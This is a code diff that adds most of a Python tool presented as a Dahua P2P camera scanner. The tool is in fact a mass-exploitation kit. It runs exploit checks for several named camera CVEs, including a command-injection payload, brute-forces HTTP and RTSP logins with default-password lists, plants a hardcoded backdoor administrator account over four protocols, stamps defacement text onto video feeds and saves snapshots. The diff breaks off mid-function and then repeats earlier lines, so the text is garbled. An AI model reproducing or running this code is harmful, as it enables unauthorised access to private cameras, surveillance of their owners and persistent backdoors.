@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-# p2pwn_scanner.py - Dahua P2P Scanner GUI v2.1 FINAL
+# scan.py - Dahua P2P Scanner GUI v2.1 FINAL
 # FIXED: UI freeze, DB bottleneck, producer thread, throttled updates
 # Requires: pip install requests
-# Run: python3 p2pwn_scanner.py
+# Run: python scan.py
 
 import os
 import re
@@ -35,6 +35,523 @@ P2P_API_V2 = "https://p2p.dahuasecurity.com/api/v2/device/info"
 P2P_HOST = "p2p.dahuasecurity.com"
 P2P_PORT = 8800
 DHIP_PORT = 37777
+HTTP_PORT = 80
+RTSP_PORT = 554
+XIONGMAI_PORT = 8000
+EZVIZ_PORT = 9010
+
+BACKDOOR_USER = "QcamUser"
+BACKDOOR_PASS = "Manhmanh123@"
+OSD_TEXT = "Qcam // NghiaVN"
+
+USERNAMES = ["admin", "root", "888888", "666666", "default", "user", "qcam"]
+PASSWORDS = [
+    "admin", "123456", "888888", "666666", "password", "default",
+    "admin123", "12345", "111111", "000000", "abc123", "dahua123",
+    "Dahua@123", "admin@123", "root", "toor", "pass", "1234",
+    "12345678", "qwerty", "letmein", "welcome", "dahua", "Dahua2023",
+    "Manhmanh123@", "Qcam@123", "qcam123",
+]
+
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"
+
+
+# ============================================================
+# HELPERS
+# ============================================================
+def ts():
+    return datetime.now().strftime("%H:%M:%S")
+
+
+def log_msg(msg, level="*"):
+    return f"[{ts()}] [{level}] {msg}"
+
+
+def make_session(auth=None):
+    s = requests.Session()
+    s.verify = False
+    s.headers.update({"User-Agent": UA, "Accept": "application/json"})
+    if auth:
+        s.auth = auth
+    return s
+
+
+def recv_all(sock, max_bytes=65536, timeout=3):
+    sock.settimeout(timeout)
+    chunks = []
+    total = 0
+    try:
+        while total < max_bytes:
+            c = sock.recv(4096)
+            if not c:
+                break
+            chunks.append(c)
+            total += len(c)
+    except Exception:
+        pass
+    return b"".join(chunks)
+
+
+# ============================================================
+# P2P SERIAL CHECK
+# ============================================================
+def check_serial(serial, timeout=5, session=None):
+    if session is None:
+        session = make_session()
+
+    for api in (P2P_API, P2P_API_V2):
+        try:
+            r = session.post(api, json={"sn": serial},
+                             headers={"Content-Type": "application/json"},
+                             timeout=timeout)
+            if r.status_code == 200:
+                try:
+                    data = r.json()
+                    if (data.get("code") == 1000
+                            or data.get("success")
+                            or data.get("device")):
+                        ip = None
+                        dev = data.get("device") or data.get("data") or {}
+                        if isinstance(dev, dict):
+                            ip = (dev.get("ip") or dev.get("address")
+                                  or dev.get("publicIp"))
+                        return True, ip, data
+                except Exception:
+                    if len(r.text) > 20:
+                        return True, None, r.text[:300]
+        except Exception:
+            pass
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((P2P_HOST, P2P_PORT))
+        pkt = (b"\x00\x00\x00\x00"
+               + serial.encode().ljust(16, b"\x00")
+               + b"\x01\x00\x00\x00")
+        s.send(pkt)
+        resp = recv_all(s, max_bytes=4096, timeout=timeout)
+        s.close()
+        if resp and len(resp) > 4:
+            return True, None, resp.hex()
+    except Exception:
+        pass
+
+    return False, None, None
+
+
+# ============================================================
+# CVE MODULE
+# ============================================================
+class CVEModule:
+    @staticmethod
+    def cve_2018_10088(ip, timeout=5):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((ip, XIONGMAI_PORT))
+            payload = b"GET /" + b"A" * 4096 + b" HTTP/1.0\r\n\r\n"
+            s.send(payload)
+            resp = recv_all(s, max_bytes=2048, timeout=timeout)
+            s.close()
+            if not resp:
+                return True, "buffer_overflow_triggered"
+            if b"uc-httpd" in resp.lower() or b"XiongMai" in resp:
+                return True, "uc-httpd_banner"
+        except ConnectionResetError:
+            return True, "connection_reset"
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def cve_2021_33044(ip, timeout=5):
+        try:
+            payload = ('{"method":"global.login","params":{"userName":"admin",'
+                       '"password":"","clientType":"NetKeyboard",'
+                       '"loginType":"Direct"},"id":1}')
+            r = requests.post(
+                f"http://{ip}/RPC2_Login", data=payload,
+                headers={"Content-Type": "application/json", "User-Agent": UA},
+                timeout=timeout)
+            if r.status_code == 200:
+                b = r.text.lower()
+                if "result" in b or "session" in b or "realm" in b:
+                    return True, r.text[:300]
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def cve_2021_33045(ip, timeout=5):
+        try:
+            payload = ('{"method":"global.login","params":{"userName":"admin",'
+                       '"password":"","clientType":"Loopback",'
+                       '"loginType":"Direct"},"id":1}')
+            r = requests.post(
+                f"http://{ip}/RPC2_Login", data=payload,
+                headers={"Content-Type": "application/json", "User-Agent": UA},
+                timeout=timeout)
+            if r.status_code == 200:
+                b = r.text.lower()
+                if "result" in b or "session" in b or "realm" in b:
+                    return True, r.text[:300]
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def cve_2021_36260(ip, timeout=5):
+        try:
+            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
+                       '<language><a>$(id)</a></language>')
+            r = requests.put(
+                f"http://{ip}/SDK/webLanguage", data=payload,
+                headers={"Content-Type": "application/xml", "User-Agent": UA},
+                timeout=timeout)
+            if r.status_code == 200:
+                body = r.text
+                if "uid=" in body or "gid=" in body or "root" in body:
+                    return True, f"cmd_injection: {body[:300]}"
+                return True, f"endpoint_reachable: {body[:200]}"
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def cve_2022_30563(ip, timeout=5):
+        try:
+            soap = ('<?xml version="1.0" encoding="UTF-8"?>'
+                    '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
+                    '<s:Body>'
+                    '<GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/device/wsdl"/>'
+                    '</s:Body></s:Envelope>')
+            r = requests.post(
+                f"http://{ip}/onvif/device_service", data=soap,
+                headers={"Content-Type": "application/soap+xml; charset=utf-8",
+                         "User-Agent": UA},
+                timeout=timeout)
+            if r.status_code == 200 and "SystemDateAndTime" in r.text:
+                return True, "onvif_reachable"
+            if r.status_code == 401:
+                return True, "onvif_auth_challenge"
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def cve_2023_48121(ip, timeout=5):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((ip, EZVIZ_PORT))
+            magic = b"\x00\x00\x00\x00"
+            cmd = b"\x01"
+            flags = b"\x00"
+            payload = b"snapshot"
+            length = struct.pack("<I", len(payload))
+            packet = magic + cmd + flags + length + payload
+            s.send(packet)
+            resp = recv_all(s, max_bytes=4096, timeout=timeout)
+            s.close()
+            if resp and len(resp) > 8:
+                return True, f"ezviz_bypass: {resp[:100].hex()}"
+        except Exception:
+            pass
+        return False, None
+
+    @classmethod
+    def run_all(cls, ip, timeout=5, enabled=None):
+        if enabled is None:
+            enabled = {"2018": True, "2021_44": True, "2021_45": True,
+                       "2021_36260": True, "2022": True, "2023": True}
+        found = []
+        if enabled.get("2018"):
+            ok, d = cls.cve_2018_10088(ip, timeout)
+            if ok:
+                found.append(("CVE-2018-10088", d))
+        if enabled.get("2021_44"):
+            ok, d = cls.cve_2021_33044(ip, timeout)
+            if ok:
+                found.append(("CVE-2021-33044", d))
+        if enabled.get("2021_45"):
+            ok, d = cls.cve_2021_33045(ip, timeout)
+            if ok:
+                found.append(("CVE-2021-33045", d))
+        if enabled.get("2021_36260"):
+            ok, d = cls.cve_2021_36260(ip, timeout)
+            if ok:
+                found.append(("CVE-2021-36260", d))
+        if enabled.get("2022"):
+            ok, d = cls.cve_2022_30563(ip, timeout)
+            if ok:
+                found.append(("CVE-2022-30563", d))
+        if enabled.get("2023"):
+            ok, d = cls.cve_2023_48121(ip, timeout)
+            if ok:
+                found.append(("CVE-2023-48121", d))
+        return found
+
+
+# ============================================================
+# BRUTE FORCE
+# ============================================================
+class BruteForce:
+    @staticmethod
+    def http(ip, timeout=5, max_attempts=None):
+        session = make_session()
+        attempts = 0
+        for u in USERNAMES:
+            for p in PASSWORDS:
+                if max_attempts and attempts >= max_attempts:
+                    return None
+                attempts += 1
+                try:
+                    r = session.post(f"http://{ip}/RPC2_Login", json={
+                        "method": "global.login",
+                        "params": {"userName": u, "password": p,
+                                   "clientType": "Web3",
+                                   "loginType": "Direct"},
+                        "id": 1,
+                    }, timeout=timeout)
+                    if r.status_code == 200 and (
+                            "result" in r.text.lower()
+                            and "true" in r.text.lower()):
+                        return f"{u}:{p}"
+                except Exception:
+                    pass
+        return None
+
+    @staticmethod
+    def rtsp(ip, timeout=5, max_attempts=None):
+        attempts = 0
+        for u in USERNAMES:
+            for p in PASSWORDS:
+                if max_attempts and attempts >= max_attempts:
+                    return None
+                attempts += 1
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(timeout)
+                    s.connect((ip, RTSP_PORT))
+                    auth = base64.b64encode(f"{u}:{p}".encode()).decode()
+                    req = (f"DESCRIBE rtsp://{ip}/ RTSP/1.0\r\n"
+                           f"CSeq: 1\r\nAuthorization: Basic {auth}\r\n\r\n")
+                    s.send(req.encode())
+                    resp = recv_all(s, max_bytes=2048,
+                                    timeout=timeout).decode(errors="ignore")
+                    s.close()
+                    if "200 OK" in resp:
+                        return f"{u}:{p}"
+                except Exception:
+                    pass
+        return None
+
+    @classmethod
+    def run(cls, ip, timeout=5, max_attempts=None):
+        creds = cls.http(ip, timeout, max_attempts)
+        if creds:
+            return creds, "http"
+        creds = cls.rtsp(ip, timeout, max_attempts)
+        if creds:
+            return creds, "rtsp"
+        return None, None
+
+
+# ============================================================
+# BACKDOOR
+# ============================================================
+class Backdoor:
+    @staticmethod
+    def sdk(ip, timeout=5):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((ip, DHIP_PORT))
+            for pw in (BACKDOOR_PASS,
+                       hashlib.md5(BACKDOOR_PASS.encode()).hexdigest()):
+                payload = json.dumps({
+                    "method": "user.add",
+                    "params": {"user": {
+                        "Name": BACKDOOR_USER, "Password": pw,
+                        "Group": "admin",
+                        "Authority": "Administrator"}},
+                    "id": 1,
+                }).encode()
+                header = struct.pack("<IIIIIIII", 0x12345678, 1,
+                                     len(payload), 0, 0, 0, 0, 0)
+                s.send(header + payload)
+                resp = recv_all(s, max_bytes=8192, timeout=timeout)
+                if resp and (b"OK" in resp.upper()
+                             or b"true" in resp.lower()):
+                    s.close()
+                    return True, "sdk"
+            s.close()
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def cgi(ip, timeout=5):
+        try:
+            r = requests.post(f"http://{ip}/cgi-bin/user.add", data={
+                "user.Name": BACKDOOR_USER,
+                "user.Password": BACKDOOR_PASS,
+                "user.Group": "admin",
+                "user.Authority": "Administrator",
+            }, headers={"User-Agent": UA}, timeout=timeout)
+            if r.status_code == 200 and (
+                    "OK" in r.text.upper() or "true" in r.text.lower()):
+                return True, "cgi"
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def dhip(ip, timeout=5):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((ip, DHIP_PORT))
+            data = json.dumps({
+                "name": BACKDOOR_USER, "password": BACKDOOR_PASS,
+                "group": "admin", "authority": 0xFFFFFFFF,
+            }).encode()
+            pkt = (b"\x00\x00\x00\x00\x01\x10"
+                   + struct.pack("<I", len(data))
+                   + struct.pack("<I", 0) + b"\x00\x00" + data)
+            s.send(pkt)
+            resp = recv_all(s, max_bytes=8192, timeout=timeout)
+            s.close()
+            if resp and (b"OK" in resp.upper()
+                         or b"true" in resp.lower()
+                         or len(resp) > 8):
+                return True, "dhip"
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def onvif(ip, timeout=5):
+        soap = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
+            'xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
+            '<s:Body><tds:CreateUsers><tds:User>'
+            f'<tds:Username>{BACKDOOR_USER}</tds:Username>'
+            f'<tds:Password>{BACKDOOR_PASS}</tds:Password>'
+            '<tds:UserLevel>Administrator</tds:UserLevel>'
+            '</tds:User></tds:CreateUsers></s:Body></s:Envelope>')
+        try:
+            r = requests.post(
+                f"http://{ip}/onvif/device_service", data=soap,
+                headers={"Content-Type": "application/soap+xml; charset=utf-8",
+                         "User-Agent": UA},
+                timeout=timeout)
+            if r.status_code == 200 and "fault" not in r.text.lower():
+                return True, "onvif"
+        except Exception:
+            pass
+        return False, None
+
+    @classmethod
+    def run_all(cls, ip, timeout=5):
+        results = []
+        for fn in (cls.sdk, cls.cgi, cls.dhip, cls.onvif):
+            ok, vec = fn(ip, timeout)
+            if ok and vec:
+                results.append(vec)
+        return results
+
+
+# ============================================================
+# OSD
+# ============================================================
+class OSD:
+    @staticmethod
+    def cgi(ip, user="admin", password="", text=OSD_TEXT,
+            channel=1, timeout=5):
+        try:
+            session = make_session(auth=(user, password))
+            params = {
+                "action": "setConfig",
+                "VideoWidget[0].Channel": channel,
+                "VideoWidget[0].Enable": "true",
+                "VideoWidget[0].Text": text,
+                "VideoWidget[0].X": 100,
+                "VideoWidget[0].Y": 100,
+                "VideoWidget[0].FontSize": 48,
+                "VideoWidget[0].FontColor": "0xFF0000",
+                "VideoWidget[0].BackColor": "0x000000",
+                "VideoWidget[0].Transparency": 0,
+            }
+            r = session.get(f"http://{ip}/cgi-bin/configManager.cgi",
+                            params=params, timeout=timeout)
+            if r.status_code == 200 and (
+                    "OK" in r.text.upper() or "true" in r.text.lower()):
+                return True
+        except Exception:
+            pass
+        return False
+
+    @staticmethod
+    def dhip(ip, text=OSD_TEXT, channel=1, timeout=5):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((ip, DHIP_PORT))
+            data = json.dumps({
+                "channel": channel,
+                "osd": {"enable": True, "text": text, "x": 100, "y": 100,
+                        "fontSize": 48, "fontColor": "0xFF0000",
+                        "backColor": "0x000000"},
+            }).encode()
+            pkt = (b"\x00\x00\x00\x00\x01\x40"
+                   + struct.pack("<I", len(data))
+                   + struct.pack("<I", 0) + b"\x00\x00" + data)
+            s.send(pkt)
+            resp = recv_all(s, max_bytes=8192, timeout=timeout)
+            s.close()
+            if resp and (b"OK" in resp.upper() or len(resp) > 8):
+                return True
+        except Exception:
+            pass
+        return False
+
+    @classmethod
+    def run(cls, ip, user="admin", password="", text=OSD_TEXT,
+            channel=1, timeout=5):
+        if cls.cgi(ip, user, password, text, channel, timeout):
+            return True, "cgi"
+        if cls.dhip(ip, text, channel, timeout):
+            return True, "dhip"
+        return False, None
+
+
+# ============================================================
+# VIDEO / SNAPSHOT
+# ============================================================
+class VideoCapture:
+    @staticmethod
+    def snapshot(ip, user="admin", password="", channel=1,
+                 timeout=8, outdir="logs"):
+        os.makedirs(outdir, exist_ok=True)
+        try:
+            r = requests.get(
+                f"http://{ip}/cgi-bin/snapshot.cgi?channel={channel}",
+                auth=(user, password), timeout=timeout)
+            if r.status_code == 200 and r.content[:2] == b"\xFF\xD8":
+                fn = os.path.join(
+                    outdir, f"snap_{ip}_ch{channel}_{int(time.time())}.jpg")
+                with open(fn, "wb") as f:
+                    f.write(r.content)
+                return True, fn
+        except Exception:
+            pass
+        return False, None
+
+    @staticmethod
+    def video_mjpeg(ip, user="admin", password="", cDHIP_PORT = 37777
 HTTP_PORT = 80
 RTSP_PORT = 554
 XIONGMAI_PORT = 8000
